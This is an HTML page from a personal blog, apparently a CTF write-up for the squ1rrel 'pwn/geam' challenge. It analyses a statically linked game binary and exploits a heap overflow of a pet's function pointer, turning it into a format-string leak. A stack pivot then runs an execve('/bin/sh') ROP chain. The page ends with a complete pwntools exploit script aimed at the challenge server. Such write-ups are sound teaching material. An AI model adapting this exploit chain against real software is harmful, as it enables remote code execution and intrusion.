@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html
+  lang="en"
+  dir="ltr"
+  
+><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>NmToan Blog</title>
+
+<meta name="generator" content="Hugo Eureka 0.9.3" />
+<link rel="stylesheet" href="//localhost:1313/css/eureka.min.d69f9ba11e39460e0c72f6952b8694b04ebcbd76fd33468ac1338291c2c709c503834d39ba9eb6427170f24918d3a11e.css">
+<script defer src="//localhost:1313/js/eureka.min.fa9a6bf6d7a50bb635b4cca7d2ba5cf3dfb095ae3798773f1328f7950028b48c17d06276594e1b5f244a25a6c969a705.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload"
+  href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&amp;family=Noto&#43;Serif&#43;SC:wght@400;600;700&amp;display=swap"
+  as="style" onload="this.onload=null;this.rel='stylesheet'">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/styles/base16/solarized-light.min.css"
+   media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/highlight.min.js"
+   crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/dart.min.js"
+     crossorigin></script>
+<link rel="stylesheet" href="//localhost:1313/css/highlightjs.min.a02d1b7bfa7653e4d7684d8787a2acd5fe733bb02bc51100ed283b052fb81ac1bd98abbcd0af6ad005b66b8f284a3ab2.css" media="print" onload="this.media='all';this.onload=null">
+
+
+<script defer type="text/javascript" src="//localhost:1313/js/fontawesome.min.e2f6d6879180aca6d7a208caf6042b48205fe0e2b24323ecb4246f857cef11589c39e283fb5a5e45945791ce4c3b7595.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css"
+   integrity="sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ"  media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js" 
+  integrity="sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY"  crossorigin></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js"
+   integrity="sha384-&#43;XBljXPPiv&#43;OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR"  crossorigin></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: "$$", right: "$$", display: true },
+        { left: "$", right: "$", display: false },
+        { left: "\\(", right: "\\)", display: false },
+        { left: "\\[", right: "\\]", display: true }
+      ],
+    });
+  });
+</script>
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js" 
+  integrity="sha384-atOyb0FxAgN9LyAc6PEf9BjgwLISyansgdH8/VXQH8p2o5vfrRgmGIJ2Sg22L0A0"  crossorigin></script>
+
+
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/images/icon_hu_cea985e214c74f98.png">
+<link rel="apple-touch-icon" sizes="180x180" href="//localhost:1313/images/icon_hu_b4231e3a3e195a.png">
+
+<meta name="description"
+  content="pwn/geam
+chall description:
+
+It&rsquo;s like Dwarf Fortress but not at all like Dwarf Fortress
+local: ./geam
+remote: nc challs.squ1rrel.dev 5001
+
+Recog
+Static
+
+We can see that this is ELF 64-bit executable file.
+When check security:
+
+canary found =&gt; don&rsquo;t buffer overflow if there is not fortmat string vuln to leak canary.
+No PIE =&gt; we don&rsquo;t need to leak base address.
+
+
+
+$ file gaem
+gaem: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=24752a56405a764a0cd0ee78b78549ff3793fb43, for GNU/Linux 3.2.0, not stripped
+squ1rrel/pwn/pwn4$ checksec gaem
+[*] &#39;squ1rrel/pwn/pwn4/gaem&#39;
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+
+Dynamic
+
+After running file: this is a 2d game
+
+Actor:">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+      "@type": "ListItem",
+      "position": 1 ,
+      "name":"Posts",
+      "item":"//localhost:1313/posts/"},{
+      "@type": "ListItem",
+      "position": 2 ,
+      "name":"",
+      "item":"//localhost:1313/posts/soulmatesqu1rrel/"}]
+}
+</script>
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "//localhost:1313/posts/soulmatesqu1rrel/"
+    },
+    "headline": "NmToan Blog","wordCount":  1167 ,
+    "publisher": {
+        "@type": "Person",
+        "name": "WANG Chucheng",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "//localhost:1313/images/icon.png"
+        }
+        },
+    "description": "\u003ch1 id=\u0022pwngeam\u0022\u003epwn\/geam\u003c\/h1\u003e\n\u003ch3 id=\u0022chall-description\u0022\u003echall description:\u003c\/h3\u003e\n\u003cul\u003e\n\u003cli\u003eIt\u0026rsquo;s like Dwarf Fortress but not at all like Dwarf Fortress\u003c\/li\u003e\n\u003cli\u003elocal: .\/geam\u003c\/li\u003e\n\u003cli\u003eremote: nc challs.squ1rrel.dev 5001\u003c\/li\u003e\n\u003c\/ul\u003e\n\u003ch3 id=\u0022recog\u0022\u003eRecog\u003c\/h3\u003e\n\u003ch4 id=\u0022static\u0022\u003eStatic\u003c\/h4\u003e\n\u003cul\u003e\n\u003cli\u003eWe can see that this is ELF 64-bit executable file.\u003c\/li\u003e\n\u003cli\u003eWhen check security:\n\u003cul\u003e\n\u003cli\u003ecanary found =\u0026gt; don\u0026rsquo;t buffer overflow if there is not fortmat string vuln to leak canary.\u003c\/li\u003e\n\u003cli\u003eNo PIE =\u0026gt; we don\u0026rsquo;t need to leak base address.\u003c\/li\u003e\n\u003c\/ul\u003e\n\u003c\/li\u003e\n\u003c\/ul\u003e\n\u003cpre\u003e\u003ccode class=\u0022language-bash\u0022\u003e$ file gaem\r\ngaem: ELF 64-bit LSB executable, x86-64, version 1 (GNU\/Linux), statically linked, BuildID[sha1]=24752a56405a764a0cd0ee78b78549ff3793fb43, for GNU\/Linux 3.2.0, not stripped\r\nsqu1rrel\/pwn\/pwn4$ checksec gaem\r\n[*] \u0027squ1rrel\/pwn\/pwn4\/gaem\u0027\r\n    Arch:       amd64-64-little\r\n    RELRO:      Partial RELRO\r\n    Stack:      Canary found\r\n    NX:         NX enabled\r\n    PIE:        No PIE (0x400000)\r\n    SHSTK:      Enabled\r\n    IBT:        Enabled\r\n    Stripped:   No\r\n\u003c\/code\u003e\u003c\/pre\u003e\n\u003ch4 id=\u0022dynamic\u0022\u003eDynamic\u003c\/h4\u003e\n\u003cul\u003e\n\u003cli\u003eAfter running file: this is a 2d game\u003c\/li\u003e\n\u003c\/ul\u003e\n\u003cp\u003eActor:\u003c\/p\u003e"
+}
+</script><meta property="og:title" content="NmToan Blog" />
+<meta property="og:type" content="article" />
+
+
+<meta property="og:image" content="//localhost:1313/images/icon.png">
+
+
+<meta property="og:url" content="//localhost:1313/posts/soulmatesqu1rrel/" />
+
+
+
+
+<meta property="og:description" content="pwn/geam
+chall description:
+
+It&rsquo;s like Dwarf Fortress but not at all like Dwarf Fortress
+local: ./geam
+remote: nc challs.squ1rrel.dev 5001
+
+Recog
+Static
+
+We can see that this is ELF 64-bit executable file.
+When check security:
+
+canary found =&gt; don&rsquo;t buffer overflow if there is not fortmat string vuln to leak canary.
+No PIE =&gt; we don&rsquo;t need to leak base address.
+
+
+
+$ file gaem
+gaem: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=24752a56405a764a0cd0ee78b78549ff3793fb43, for GNU/Linux 3.2.0, not stripped
+squ1rrel/pwn/pwn4$ checksec gaem
+[*] &#39;squ1rrel/pwn/pwn4/gaem&#39;
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+
+Dynamic
+
+After running file: this is a 2d game
+
+Actor:" />
+
+
+
+
+<meta property="og:locale" content="en" />
+
+
+
+
+<meta property="og:site_name" content="NmToan Blog" />
+
+
+
+
+
+
+
+
+
+<meta property="article:section" content="posts" />
+
+
+
+
+
+
+  <body class="flex min-h-screen flex-col">
+    <header
+      class="min-h-16 pl-scrollbar bg-secondary-bg fixed z-50 flex w-full items-center shadow-sm"
+    >
+      <div class="mx-auto w-full max-w-screen-xl"><script>
+    let storageColorScheme = localStorage.getItem("lightDarkMode")
+    if (((storageColorScheme == 'Auto' || storageColorScheme == null) && window.matchMedia("(prefers-color-scheme: dark)").matches) || storageColorScheme == "Dark") {
+        document.getElementsByTagName('html')[0].classList.add('dark')
+    }
+</script>
+<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
+    <a href="/" class="me-6 text-primary-text text-xl font-bold">NmToan Blog</a>
+    <button id="navbar-btn" class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <div id="target"
+        class="hidden block md:flex md:grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
+        <div class="md:flex md:h-16 text-sm md:grow pb-4 md:pb-0 border-b md:border-b-0">
+            <a href="/#about" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">About</a>
+            <a href="/posts/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  selected-menu-item  me-4">Posts</a>
+            <a href="/docs/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Docs</a>
+        </div>
+
+        <div class="flex">
+            <div class="relative pt-4 md:pt-0">
+                <div class="cursor-pointer hover:text-eureka" id="lightDarkMode">
+                    <i class="fas fa-adjust"></i>
+                </div>
+                <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id="is-open">
+                </div>
+                <div class="absolute flex flex-col start-0 md:start-auto end-auto md:end-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40"
+                    id='lightDarkOptions'>
+                    <span class="px-4 py-1 hover:text-eureka" name="Light">Light</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Dark">Dark</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Auto">Auto</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id="is-open-mobile">
+    </div>
+
+</nav>
+<script>
+    
+    let element = document.getElementById('lightDarkMode')
+    if (storageColorScheme == null || storageColorScheme == 'Auto') {
+        document.addEventListener('DOMContentLoaded', () => {
+            window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change', switchDarkMode)
+        })
+    } else if (storageColorScheme == "Light") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'sun')
+        element.firstElementChild.classList.add('fa-sun')
+    } else if (storageColorScheme == "Dark") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'moon')
+        element.firstElementChild.classList.add('fa-moon')
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        getcolorscheme();
+        switchBurger();
+    });
+</script>
+</div>
+    </header>
+    <main class="grow pt-16">
+        <div class="pl-scrollbar">
+          <div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8">
+  
+  
+  <div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12">
+    <div
+      class="lg:col-start-2 bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"
+    >
+      <article class="prose">
+  <h1 class="mb-4"></h1>
+
+  <div
+  class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"
+>
+  <div class="me-6 my-2">
+    <i class="fas fa-calendar me-1"></i>
+    <span
+      >0001-01-01</span
+    >
+  </div>
+  <div class="me-6 my-2">
+    <i class="fas fa-clock me-1"></i>
+    <span>6 min read</span>
+  </div>
+
+  
+
+  
+</div>
+
+
+  
+  
+
+  <h1 id="pwngeam">pwn/geam</h1>
+<h3 id="chall-description">chall description:</h3>
+<ul>
+<li>It&rsquo;s like Dwarf Fortress but not at all like Dwarf Fortress</li>
+<li>local: ./geam</li>
+<li>remote: nc challs.squ1rrel.dev 5001</li>
+</ul>
+<h3 id="recog">Recog</h3>
+<h4 id="static">Static</h4>
+<ul>
+<li>We can see that this is ELF 64-bit executable file.</li>
+<li>When check security:
+<ul>
+<li>canary found =&gt; don&rsquo;t buffer overflow if there is not fortmat string vuln to leak canary.</li>
+<li>No PIE =&gt; we don&rsquo;t need to leak base address.</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-bash">$ file gaem
+gaem: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=24752a56405a764a0cd0ee78b78549ff3793fb43, for GNU/Linux 3.2.0, not stripped
+squ1rrel/pwn/pwn4$ checksec gaem
+[*] 'squ1rrel/pwn/pwn4/gaem'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+</code></pre>
+<h4 id="dynamic">Dynamic</h4>
+<ul>
+<li>After running file: this is a 2d game</li>
+</ul>
+<p>Actor:</p>
+<blockquote>
+<ul>
+<li>@ = player</li>
+<li>E = enemy</li>
+<li>P = pet</li>
+<li>. = empty box</li>
+</ul>
+</blockquote>
+<p>Menu:</p>
+<blockquote>
+<ul>
+<li>m → move mode</li>
+<li>l → look map</li>
+<li>t → talk with nearby pet</li>
+<li>q → quit</li>
+</ul>
+</blockquote>
+<p>Move mode:</p>
+<blockquote>
+<ul>
+<li>w → up</li>
+<li>a → left</li>
+<li>s → down</li>
+<li>d → right</li>
+<li>e → attack</li>
+<li>r → rename pet</li>
+<li>q → quit move mode</li>
+</ul>
+</blockquote>
+<p>Interactive:</p>
+<pre><code class="language-bash">$ ./gaem
+== Tiny Arena ==
+Hero's name: %s
+Welcome, %s!
+
+m) move mode (wasd, attack, rename pet)
+l) look at map
+t) speak to nearby pet
+q) quit
+&gt; l
+
+-- %s @ (2,2) --
+................
+.............E..
+..@....E........
+.........P......
+....P...........
+...........E....
+................
+................
+
+m) move mode (wasd, attack, rename pet)
+l) look at map
+t) speak to nearby pet
+q) quit
+&gt; t
+No pet nearby.
+
+m) move mode (wasd, attack, rename pet)
+l) look at map
+t) speak to nearby pet
+q) quit
+&gt; m
+
+-- %s @ (2,2) --
+................
+.............E..
+..@....E........
+.........P......
+....P...........
+...........E....
+................
+................
+Keys: wasd=move, e=attack, r=rename pet, q=exit move mode
+&gt; wwww
+
+-- %s @ (2,0) --
+..@.............
+.............E..
+.......E........
+.........P......
+....P...........
+...........E....
+................
+................
+
+m) move mode (wasd, attack, rename pet)
+l) look at map
+t) speak to nearby pet
+q) quit
+&gt; l
+
+-- %s @ (2,0) --
+..@.............
+.............E..
+.......E........
+.........P......
+....P...........
+...........E....
+................
+................
+
+m) move mode (wasd, attack, rename pet)
+l) look at map
+t) speak to nearby pet
+q) quit
+&gt;
+</code></pre>
+<h3 id="disassemble--decompile-">Disassemble &amp; Decompile :</h3>
+<ul>
+<li>After dumping, we got these main funtions:</li>
+</ul>
+<pre><code class="language-bash">$ objdump -d gaem | grep &quot;&gt;:&quot;
+...
+0000000000401a2d &lt;dog_purr&gt;:
+0000000000401a4e &lt;cat_purr&gt;:
+0000000000401a6f &lt;spawn_enemy&gt;:
+0000000000401ad3 &lt;spawn_pet&gt;:
+0000000000401b37 &lt;read_line&gt;:
+0000000000401b77 &lt;draw_map&gt;:
+0000000000401c90 &lt;pet_near&gt;:
+0000000000401cf4 &lt;main&gt;:
+...
+</code></pre>
+<ul>
+<li><code>dog_purr</code> func: act as callbacks when the player interacts with a pet.</li>
+<li><code>cat_purr</code> func: act as callbacks when the player interacts with a pet.</li>
+</ul>
+<p>Both functions:</p>
+<blockquote>
+<ul>
+<li>take a user-controlled string as input</li>
+<li>pass it directly into printf</li>
+</ul>
+</blockquote>
+<ul>
+<li>
+<p><code>spawn_enemy</code> func: This function initializes an enemy object on the heap:</p>
+<ul>
+<li>Allocates 36 bytes using calloc</li>
+<li>Copies the enemy name using strncpy (max 23 bytes)</li>
+<li>Stores attributes:
+<ul>
+<li>v7[6] → HP</li>
+<li>v7[7] → x-coordinate</li>
+<li>v7[8] → y-coordinate</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>spawn_pet</code> func: This function creates a pet object, which is more interesting from an exploitation perspective:</p>
+<ul>
+<li>Allocates 48 bytes</li>
+<li>Copies the pet name (max 31 bytes)</li>
+<li>Stores:
+<ul>
+<li>offset +32 → function pointer (callback)</li>
+<li>offset +40 → x-coordinate</li>
+<li>offset +44 → y-coordinate</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>read_line</code> func: This function is used throughout the program to handle user input.</p>
+<ul>
+<li>Reads user input with a size limit</li>
+<li>Replaces the trailing newline (\n) with a null byte</li>
+<li>Exits cleanly if input is closed</li>
+</ul>
+</li>
+<li>
+<p><code>draw_map</code> func: Responsible for rendering the 2D map:</p>
+<ul>
+<li>Initializes an 8×16 grid filled with &lsquo;.&rsquo;</li>
+<li>Places:
+<ul>
+<li>&lsquo;E&rsquo; for enemies</li>
+<li>&lsquo;P&rsquo; for pets</li>
+<li>&lsquo;@&rsquo; for the player</li>
+</ul>
+</li>
+<li>Then prints:</li>
+</ul>
+<pre><code class="language-c">    printf(&quot;\n-- %s @ (%d,%d) --\n&quot;, name, x, y);
+</code></pre>
+</li>
+<li>
+<p><code>pet_near</code> func: Checks whether a pet is adjacent to the player:</p>
+<ul>
+<li>Iterates through all pets</li>
+<li>Computes distance using:
+<ul>
+<li>|dx| &lt;= 1 &amp;&amp; |dy| &lt;= 1</li>
+</ul>
+</li>
+<li>Returns a pointer to the nearby pet if found, otherwise NULL</li>
+<li>Used in:
+<ul>
+<li>Talking to pets (t)</li>
+<li>Renaming pets (r)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>main</code> func: The main game loop orchestrates all gameplay logic.</p>
+<ul>
+<li>Initialization:
+<ul>
+<li>Disables buffering (setvbuf)</li>
+<li>Sets a timeout (alarm(120))</li>
+<li>Spawns a helper thread (thread_warmup)</li>
+<li>Reads the hero’s name</li>
+<li>Spawns:
+<ul>
+<li>3 enemies</li>
+<li>2 pets (each with a different callback)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Game Loop:
+<ul>
+<li>m → move mode</li>
+<li>l → display map</li>
+<li>t → interact with nearby pet</li>
+<li>q → quit</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="vulnerabilities">Vulnerabilities</h3>
+<h4 id="1-heap-based-buffer-overflow">1. Heap-based Buffer Overflow</h4>
+<p>In the pet rename functionality, the code uses <code>strcpy</code> to copy the user-provided name into a fixed-size buffer on the heap.</p>
+<pre><code class="language-c">strcpy(pet-&gt;name, user_input);
+</code></pre>
+<p>The <code>pet</code> structure is approximately 0x30 bytes:</p>
+<ul>
+<li><code>name</code>: 32 bytes (offset 0)</li>
+<li><code>func_ptr</code>: 8 bytes (offset 32 / 0x20)</li>
+</ul>
+<p>By providing a name longer than 32 bytes, we can overwrite the <code>func_ptr</code>.</p>
+<h4 id="2-format-string-vulnerability">2. Format String Vulnerability</h4>
+<p>The pet&rsquo;s default interaction function is <code>cat_purr</code>, which calls <code>printf</code> with a fixed format string. However, if we overwrite the pet&rsquo;s function pointer with the address of <code>printf</code> itself (<code>0x4056b0</code>), the interaction becomes:</p>
+<pre><code class="language-c">printf(user_input);
+</code></pre>
+<p>This triggers a format string vulnerability.</p>
+<h3 id="exploitation-strategy">Exploitation Strategy</h3>
+<h4 id="1-reconnaissance">1. Reconnaissance</h4>
+<ul>
+<li>The binary is statically linked and has NX enabled but no PIE.</li>
+<li>We can find the address of <code>printf</code> using <code>nm</code> or <code>objdump</code>.</li>
+<li>We can find ROP gadgets like <code>pop rdi ; ret</code>, <code>pop rsi ; ret</code>, etc., since it&rsquo;s a large static binary.</li>
+</ul>
+<h4 id="2-leakage">2. Leakage</h4>
+<p>Using the format string vulnerability, we can leak stack addresses to find the location of our buffers and the return addresses.</p>
+<ul>
+<li><code>%15$p</code> leaks a stack address.</li>
+<li><code>%16$p</code> points to our input buffer.</li>
+</ul>
+<h4 id="3-arbitrary-write--rce">3. Arbitrary Write &amp; RCE</h4>
+<p>The plan was to use the format string vulnerability to write a ROP chain to the return address of the <code>main</code> function or a similar target.
+The ROP chain targets <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>:</p>
+<ol>
+<li><code>pop rdi ; ret</code> -&gt; address of &ldquo;/bin/sh&rdquo;</li>
+<li><code>pop rsi ; ret</code> -&gt; 0</li>
+<li><code>pop rax ; ret</code> -&gt; 59</li>
+<li><code>syscall</code></li>
+</ol>
+<h3 id="script-exploit-poc">Script exploit (Poc)</h3>
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+# --- Addresses &amp; Gadgets ---
+printf_addr = 0x4056b0
+pop_rdi = 0x40224f
+pop_rsi = 0x401abb
+pop_rax = 0x4309db
+syscall = 0x40143c
+ret = 0x401016
+# add rsp, 0x60 ; pop rbx ; pop r12 ; pop rbp ; ret
+pivot_gadget = 0x428474
+
+def exploit(io):
+    log.info(&quot;Starting exploit...&quot;)
+    
+    # Init game
+    io.recvuntil(b'name: ')
+    io.sendline(b'Hero')
+    io.recvuntil(b'&gt; ')
+    io.sendline(b'm')
+    io.recvuntil(b'&gt; ')
+    io.sendline(b'ddss')
+    
+    # --- Step 1: Overwrite to Leak Stack ---
+    io.recvuntil(b'&gt; ')
+    io.sendline(b'm')
+    io.recvuntil(b'&gt; ')
+    io.sendline(b'r')
+    io.recvuntil(b': ')
+    io.sendline(b'A' * 0x20 + p64(printf_addr)[:3])
+    
+    io.recvuntil(b'&gt; ')
+    io.sendline(b't')
+    io.recvuntil(b': ')
+    io.sendline(b'LEAK.%15$p')
+    io.recvuntil(b'LEAK.')
+    
+    L15 = int(io.recvline().strip(), 16)
+    log.success(f&quot;Stack Leak (L15): {hex(L15)}&quot;)
+    
+    # --- Step 2: Calculate /bin/sh address ---
+    OFFSET = -224 
+    bin_sh_addr = L15 + OFFSET
+    log.info(f&quot;Target /bin/sh addr: {hex(bin_sh_addr)}&quot;)
+    
+    # --- Step 3: Overwrite with Pivot Gadget ---
+    io.recvuntil(b'&gt; ')
+    io.sendline(b'm')
+    io.recvuntil(b'&gt; ')
+    io.sendline(b'r')
+    io.recvuntil(b': ')
+    io.sendline(b'A' * 0x20 + p64(pivot_gadget)[:3])
+    
+    # --- Step 4: Prepare ROP Chain and Trigger ---
+    io.recvuntil(b'&gt; ')
+    io.sendline(b't')
+    io.recvuntil(b': ')
+    
+    # Setup execve('/bin/sh', 0, 0)
+    rop = b''
+    rop += p64(pop_rdi) + p64(bin_sh_addr)
+    rop += p64(pop_rsi) + p64(0)
+    rop += p64(pop_rax) + p64(59)
+    rop += p64(syscall)
+    
+    payload = (p64(ret) * 4) + rop + b'/bin/sh\x00'
+    
+    # --- GDB Debugging ---
+    gdbscript = '''
+    b *0x401f15
+    b *0x40143c
+    continue
+    '''
+    # gdb.attach(io, gdbscript=gdbscript)
+    # sleep(1) 
+    
+    # Send payload and trigger shell
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == '__main__':
+    import sys
+    if len(sys.argv) &gt; 1 and sys.argv[1] == 'remote':
+        io = remote('challs.squ1rrel.dev', 5001)
+    else:
+        io = process('./gaem')
+    
+    exploit(io)
+</code></pre>
+
+</article>
+
+
+      
+
+      
+
+
+
+      
+
+      
+  <div
+    class="-mx-2 mt-4 flex flex-col border-t px-2 pt-4 md:flex-row md:justify-between"
+  >
+    <div>
+      
+        <span class="text-primary-text block font-bold"
+          >Previous</span
+        >
+        <a href="//localhost:1313/posts/vcspassport_blue_team_ctf_gimme_your_point/" class="block">VCSPassport BlueTeam CTF Gimme_your_point!</a>
+      
+    </div>
+    <div class="mt-4 md:mt-0 md:text-right">
+      
+    </div>
+  </div>
+
+
+      
+
+
+
+    </div>
+    
+
+    
+    
+  </div>
+
+  
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        hljs.highlightAll();
+      });
+    </script>
+
+          </div>
+        </div>
+      
+    </main>
+    <footer class="pl-scrollbar">
+      <div class="mx-auto w-full max-w-screen-xl"><div class="text-center p-6 pin-b">
+    <p class="text-sm text-tertiary-text">&copy; 2021 <a href="https://www.wangchucheng.com/">WANG Chucheng</a> and <a href="https://www.ruiqima.com/">MA Ruiqi</a>
+ &middot;  Powered by the <a href="https://github.com/wangchucheng/hugo-eureka" class="hover:text-eureka">Eureka</a> theme for <a href="https://gohugo.io" class="hover:text-eureka">Hugo</a></p>
+</div></div>
+    </footer>
+  </body>
+</html>
